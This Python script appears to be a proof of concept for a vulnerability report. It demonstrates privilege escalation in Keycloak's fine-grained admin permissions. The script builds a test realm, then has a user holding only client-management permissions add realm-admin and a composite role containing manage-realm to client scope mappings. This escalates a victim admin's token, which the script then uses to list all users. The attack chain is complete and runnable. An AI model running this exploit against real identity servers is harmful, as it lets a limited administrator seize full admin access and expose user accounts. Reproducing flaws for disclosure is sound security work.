#!/usr/bin/env python3
"""K1 re-proof with FGAP ENABLED (Sorona SOR-EC0RS7 follow-up).

Same attack chain as proof2.py, but the realm is created with
adminPermissionsEnabled=true (FGAP V2 evaluator, the default FGAP generation
in Keycloak 26.8.2), and the delegated admin holds NO realm-management roles:
its authority comes only from an FGAP permission on the admin-permissions
client granting client-management scopes (view, manage, map-roles,
map-roles-client-scope, map-roles-composite) on the Clients resource type --
the FGAP expression of a manage-clients delegation, nothing else.

Usage: proof_fgap.py <realm-name> <outdir>
"""
import base64, json, os, sys, urllib.request, urllib.error, urllib.parse

BASE = "http://127.0.0.1:8080"
REALM = sys.argv[1]
OUT = sys.argv[2]
os.makedirs(OUT, exist_ok=True)
LOG = []
TRACE = []
SEQ = [0]

def log(msg):
    print(msg, flush=True)
    LOG.append(msg)

def req(method, url, token=None, body=None, form=None):
    data = None
    headers = {}
    sent = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
        sent = body
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        sent = form
    if token:
        headers["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read().decode()
            status = resp.status
            parsed = json.loads(raw) if raw else None
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        status = e.code
        try:
            parsed = json.loads(raw)
        except Exception:
            parsed = raw
    SEQ[0] += 1
    resp_txt = raw if len(raw) <= 1500 else raw[:1500] + "...[truncated]"
    TRACE.append(f"--- #{SEQ[0]} {method} {url}\n>>> {json.dumps(sent) if sent is not None else ''}\n<<< HTTP {status}\n{resp_txt}\n")
    return status, parsed

def token(realm, client, username, password, secret=None):
    form = {"client_id": client, "username": username, "password": password,
            "grant_type": "password"}
    if secret:
        form["client_secret"] = secret
    st, resp = req("POST", f"{BASE}/realms/{realm}/protocol/openid-connect/token", form=form)
    assert st == 200, f"token failed {st}: {resp}"
    return resp["access_token"]

def decode(tok):
    payload = tok.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))

def rm_roles(p):
    return sorted(p.get("resource_access", {}).get("realm-management", {}).get("roles", []))

def main():
    master = token("master", "admin-cli", "admin", "adminpass")

    # ---- realm WITH FGAP (admin permissions) enabled ----
    st, _ = req("POST", f"{BASE}/admin/realms", token=master,
                body={"realm": REALM, "enabled": True, "adminPermissionsEnabled": True})
    log(f"[setup] create realm {REALM} with adminPermissionsEnabled=true: HTTP {st}")
    A = f"{BASE}/admin/realms/{REALM}"
    st, rrep = req("GET", A, token=master)
    if rrep.get("adminPermissionsEnabled") is not True:
        log(f"[setup] adminPermissionsEnabled not true after create ({rrep.get('adminPermissionsEnabled')}); retrying via PUT")
        rrep["adminPermissionsEnabled"] = True
        st2, _ = req("PUT", A, token=master, body=rrep)
        st, rrep = req("GET", A, token=master)
        log(f"[setup] PUT realm: HTTP {st2}; adminPermissionsEnabled now {rrep.get('adminPermissionsEnabled')}")
    json.dump(rrep, open(f"{OUT}/realm-rep.json", "w"), indent=1)
    log(f"[fgap] realm adminPermissionsEnabled = {rrep.get('adminPermissionsEnabled')}")

    st, aps = req("GET", f"{A}/clients?clientId=admin-permissions", token=master)
    assert aps, "admin-permissions client not found"
    AP = aps[0]["id"]
    log(f"[fgap] admin-permissions client uuid={AP}")
    AZ = f"{A}/clients/{AP}/authz/resource-server"
    st, resources = req("GET", f"{AZ}/resource", token=master)
    st, scopes = req("GET", f"{AZ}/scope", token=master)
    fgap_cfg = {"realm": REALM, "adminPermissionsEnabled": rrep.get("adminPermissionsEnabled"),
                "adminPermissionsClient": "admin-permissions", "adminPermissionsClientUuid": AP,
                "resources": [{"id": r.get("id") or r.get("_id"), "name": r.get("name"), "type": r.get("type")} for r in (resources or [])],
                "scopes": [{"id": s.get("id") or s.get("_id"), "name": s.get("name")} for s in (scopes or [])]}
    log(f"[fgap] resource-server resources: {[r.get('name') for r in (resources or [])]}")
    log(f"[fgap] resource-server scopes: {[s.get('name') for s in (scopes or [])]}")

    st, clients = req("GET", f"{A}/clients?clientId=realm-management", token=master)
    RM = clients[0]["id"]
    def client_role(name):
        st, role = req("GET", f"{A}/clients/{RM}/roles/{name}", token=master)
        return role
    realm_admin = client_role("realm-admin")
    manage_realm = client_role("manage-realm")
    log(f"[setup] realm-management uuid={RM}")

    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "app-user"})
    st, app_user = req("GET", f"{A}/roles/app-user", token=master)
    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "plain-role"})
    st, plain_role = req("GET", f"{A}/roles/plain-role", token=master)
    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "innocent-bundle"})
    st, bundle = req("GET", f"{A}/roles/innocent-bundle", token=master)
    st, _ = req("POST", f"{A}/roles/innocent-bundle/composites", token=master,
                body=[{"id": manage_realm["id"], "name": "manage-realm"}])
    log("[setup] realm roles app-user, plain-role, innocent-bundle(->manage-realm) created")

    def make_client(cid):
        st, _ = req("POST", f"{A}/clients", token=master, body={
            "clientId": cid, "enabled": True, "publicClient": False,
            "secret": "portal-secret", "directAccessGrantsEnabled": True,
            "standardFlowEnabled": True, "fullScopeAllowed": False})
        st, cl = req("GET", f"{A}/clients?clientId={cid}", token=master)
        uuid = cl[0]["id"]
        st2, _ = req("POST", f"{A}/clients/{uuid}/scope-mappings/realm", token=master,
                     body=[{"id": app_user["id"], "name": "app-user"}])
        log(f"[setup] client {cid} (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP {st2}")
        return uuid

    portal = make_client("portal")
    portal2 = make_client("portal2")

    st, _ = req("POST", f"{A}/clients", token=master,
                body={"clientId": "deleg-app", "enabled": True})
    st, da = req("GET", f"{A}/clients?clientId=deleg-app", token=master)
    deleg_app = da[0]["id"]
    st, _ = req("POST", f"{A}/clients/{deleg_app}/roles", token=master,
                body={"name": "deleg-role"})
    log("[setup] client deleg-app with role deleg-role created")

    st, scopes_all = req("GET", f"{A}/client-scopes", token=master)
    kc_scope = [s for s in scopes_all if s["name"] == "kc-admin-api"][0]
    log(f"[setup] built-in client scope kc-admin-api id={kc_scope['id']}")

    def make_user(name, pw):
        st, _ = req("POST", f"{A}/users", token=master, body={
            "username": name, "enabled": True, "email": f"{name}@example.local",
            "emailVerified": True, "firstName": name, "lastName": "Test",
            "credentials": [{"type": "password", "value": pw, "temporary": False}]})
        st, users = req("GET", f"{A}/users?username={name}", token=master)
        return users[0]["id"]

    victim = make_user("victim", "victimpass")
    st, _ = req("POST", f"{A}/users/{victim}/role-mappings/clients/{RM}",
                token=master, body=[{"id": realm_admin["id"], "name": "realm-admin"}])
    log(f"[setup] victim granted realm-admin (by trusted admin): HTTP {st}")

    delegated = make_user("delegated", "delegpass")
    st, eff = req("GET", f"{A}/users/{delegated}/role-mappings/clients/{RM}", token=master)
    st, eff_realm = req("GET", f"{A}/users/{delegated}/role-mappings/realm", token=master)
    log(f"[setup] delegated holds NO admin roles: realm-management mappings={eff}, realm mappings={eff_realm}")

    # ---- FGAP grant: client-management delegation via admin-permissions authz ----
    clients_res = [r for r in resources if r.get("name") == "Clients"][0]
    clients_res_id = clients_res.get("id") or clients_res.get("_id")
    want_scopes = ["view", "manage", "map-roles", "map-roles-client-scope", "map-roles-composite"]
    scope_ids = {s["name"]: (s.get("id") or s.get("_id")) for s in scopes if s.get("name") in want_scopes}
    assert set(scope_ids) == set(want_scopes), f"missing scopes: {scope_ids}"
    st, pol = req("POST", f"{AZ}/policy/user", token=master, body={
        "name": "delegated-admin-user-policy", "description": "FGAP user policy for user 'delegated'",
        "logic": "POSITIVE", "users": [delegated]})
    log(f"[fgap] create user policy for delegated: HTTP {st} -> {pol}")
    pol_id = pol["id"] if isinstance(pol, dict) else None
    st, perm = req("POST", f"{AZ}/policy/scope", token=master, body={
        "name": "delegated-manage-clients", "description": "FGAP delegation: manage clients only",
        "logic": "POSITIVE", "decisionStrategy": "UNANIMOUS", "resourceType": "Clients",
        "resources": [clients_res_id],
        "scopes": [scope_ids[n] for n in want_scopes],
        "policies": [pol_id]})
    log(f"[fgap] create scope permission on Clients resource {want_scopes}: HTTP {st} -> {perm}")
    fgap_cfg["grant"] = {"userPolicy": pol, "scopePermission": perm,
                         "resourceName": "Clients", "scopesGranted": want_scopes,
                         "subjectUser": "delegated", "subjectUserId": delegated}
    json.dump(fgap_cfg, open(f"{OUT}/fgap-config.json", "w"), indent=1)

    dtok = token(REALM, "admin-cli", "delegated", "delegpass")
    dpayload = decode(dtok)
    log(f"[fgap] delegated token resource_access: {dpayload.get('resource_access')}")
    st, _ = req("GET", f"{A}/clients", token=dtok)
    log(f"[fgap-check] delegated GET /clients (FGAP view/manage on Clients): HTTP {st} (expect 200)")
    st, _ = req("GET", f"{A}/users", token=dtok)
    log(f"[fgap-check] delegated GET /users (no Users permission granted): HTTP {st} (expect 403)")
    st, _ = req("GET", A, token=dtok)
    log(f"[fgap-check] delegated GET /admin/realms/{REALM} (no realm permission): HTTP {st} (expect 403)")

    def victim_token(client):
        return token(REALM, client, "victim", "victimpass", secret="portal-secret")

    # ---- baseline ----
    vt = victim_token("portal")
    v0 = decode(vt)
    json.dump(v0, open(f"{OUT}/token-victim-baseline.json", "w"), indent=1)
    log(f"[baseline] victim@portal realm-management roles: {rm_roles(v0)}; aud={v0.get('aud')}; scope={v0.get('scope')}")
    st, _ = req("GET", f"{A}/users", token=vt)
    log(f"[baseline] victim@portal token -> GET /admin/realms/{REALM}/users: HTTP {st}")

    # ---- legitimate step: delegated attaches kc-admin-api scope to portal ----
    st, resp = req("PUT", f"{A}/clients/{portal}/default-client-scopes/{kc_scope['id']}", token=dtok)
    log(f"[legit] delegated assigns kc-admin-api client scope to portal: HTTP {st} {resp if st >= 400 else ''}")
    vt = victim_token("portal")
    vpre = decode(vt)
    json.dump(vpre, open(f"{OUT}/token-victim-pre-attack.json", "w"), indent=1)
    log(f"[pre-attack] victim@portal realm-management roles: {rm_roles(vpre)}; aud={vpre.get('aud')}; scope={vpre.get('scope')}")
    st, _ = req("GET", f"{A}/users", token=vt)
    log(f"[pre-attack] victim@portal token (admin audience, roles still filtered) -> GET users: HTTP {st} (expect 403)")

    # ---- CONTROL: guarded sibling (addComposites -> requireMapComposite) ----
    st, resp = req("POST", f"{A}/clients/{deleg_app}/roles/deleg-role/composites",
                   token=dtok, body=[{"id": realm_admin["id"], "name": "realm-admin"}])
    log(f"[control] delegated adds realm-admin as composite child of deleg-role: HTTP {st} (expect 403) resp={resp if st>=400 else ''}")

    # ---- discriminator probes on portal2 (realm-role scope mappings) ----
    st, resp = req("POST", f"{A}/clients/{portal2}/scope-mappings/realm",
                   token=dtok, body=[{"id": plain_role["id"], "name": "plain-role"}])
    log(f"[probe] delegated adds PLAIN realm role plain-role to portal2 scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    st, resp = req("POST", f"{A}/clients/{portal2}/scope-mappings/realm",
                   token=dtok, body=[{"id": bundle["id"], "name": "innocent-bundle"}])
    log(f"[attack2] delegated adds composite innocent-bundle (child=manage-realm) to portal2 scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    v2 = decode(victim_token("portal2"))
    json.dump(v2, open(f"{OUT}/token-victim-portal2.json", "w"), indent=1)
    log(f"[attack2] victim@portal2 realm-management roles now: {rm_roles(v2)}")

    # ---- ATTACK 1: realm-admin into portal's client-role scope mappings ----
    st, resp = req("POST", f"{A}/clients/{portal}/scope-mappings/clients/{RM}",
                   token=dtok, body=[{"name": "realm-admin"}])
    log(f"[attack1] delegated adds realm-admin to portal scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    vt = victim_token("portal")
    v1 = decode(vt)
    json.dump(v1, open(f"{OUT}/token-victim-after-attack1.json", "w"), indent=1)
    log(f"[attack1] victim@portal realm-management roles now: {rm_roles(v1)}")
    st, users = req("GET", f"{A}/users", token=vt)
    n = len(users) if isinstance(users, list) else users
    log(f"[impact] victim@portal post-attack token -> GET /admin/realms/{REALM}/users: HTTP {st} (entries: {n})")
    if isinstance(users, list):
        log(f"[impact] usernames visible: {[u.get('username') for u in users]}")
    st, _ = req("GET", A, token=vt)
    log(f"[impact] victim@portal post-attack token -> GET /admin/realms/{REALM}: HTTP {st}")

    with open(f"{OUT}/proof-log.txt", "w") as f:
        f.write("\n".join(LOG) + "\n")
    with open(f"{OUT}/http-trace.txt", "w") as f:
        f.write("\n".join(TRACE))

if __name__ == "__main__":
    main()
